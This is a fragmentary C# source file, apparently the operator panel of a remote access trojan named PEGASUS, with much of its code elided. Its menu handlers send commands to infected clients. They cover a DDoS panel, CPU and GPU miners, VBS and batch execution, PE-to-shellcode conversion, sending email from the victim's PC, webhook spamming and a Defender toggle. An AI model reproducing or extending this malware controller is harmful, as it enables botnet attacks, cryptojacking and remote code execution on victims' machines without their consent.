...
using CPUClientSettings = PEGASUS.Design.CPUClientSettings;
using GPUClientSettings = PEGASUS.Design.GPUClientSettings;
using FormMiner = PEGASUS.Design.FormMiner;
using FrmWebHookSPM = PEGASUS.Design.FrmWebHookSPM;
using Server;
using FrmEmailer = PEGASUS.Design.FrmEmailer;
using FrmCSPM = PEGASUS.Design.FrmCSPM;
using PeToShell = PEGASUS.Design.PeToShell;
...
namespace Server
{
    ...
    public partial class Form1 : Form
    {
        ...
        private void remoteInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
        ...
        private void remoteFunToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
        ...
        private void ddosPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.Items.Count > 0)
        ...
        private void getPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
        ...
        private void executeVbsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
        ...
        private void mergebatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
        ...
        private void getPanelToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        ...
        private void resetCmdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                return;
        ...
        private void windows10LtscToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                return;
        ...
        private void windows81ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                return;
        ...
        private void onToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ...
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "enableDefedner";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
        ...
        private void sTARTToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            try
            {
                PEGASUS.Design.CPUClientSettings formSend = new CPUClientSettings();
                formSend.ShowDialog();
        ...
        private void sTARTToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                PEGASUS.Design.GPUClientSettings formSend = new GPUClientSettings();
                formSend.ShowDialog();
                if (formSend.metroSetButton2.Text.Length > 0)
                {
                    MsgPack packet = new MsgPack();
        ...
        private void sTOPToolStripMenuItem7_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                return;
        ...
        private void sEMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
        ...
        private void Execution(string hook, string message)
        {
            MsgPack msgPack = new MsgPack();
        ...
        private void sendEmailFromClientPCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                PEGASUS.Design.FrmEmailer frmEmailer = new FrmEmailer();
        ...
        private void getPanelToolStripMenuItem2_Click(object sender, EventArgs e)
        {
        ...
        private void getPanelToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            new PeToShell().Show();
        }

        private void cleanRelaodToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count <= 0)
            {
                return;
        ...
        private void connectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ...
            try
            {
                ...
                for (int i = 0; i < selectedClients.Length; i++)
                {
                    ...
                    // Параметры:
                    //   owner:
                    //     Любой объект, реализующий System.Windows.Forms.IWin32Window, которое представляет
                    //     окно верхнего уровня — будущего собственника модального диалогового окна.
                    //
                    // Возврат:
                    //     Одно из значений System.Windows.Forms.DialogResult.
                    //
                    // Исключения:
                    ...
                    //     Отображаемая форма уже отображена. -или- Отображаемая форма отключена. -или-
                    //     Отображаемая форма не является окном верхнего уровня. -или- Отображаемая в виде
                    //     диалогового окна форма уже является модальной формой. -или- Текущий процесс не
                    //     выполняется в интерактивном пользовательском режиме (дополнительные сведения
                    //     см. в описании свойства System.Windows.Forms.SystemInformation.UserInteractive).
                }
            }
            catch (Exception ex)
            {
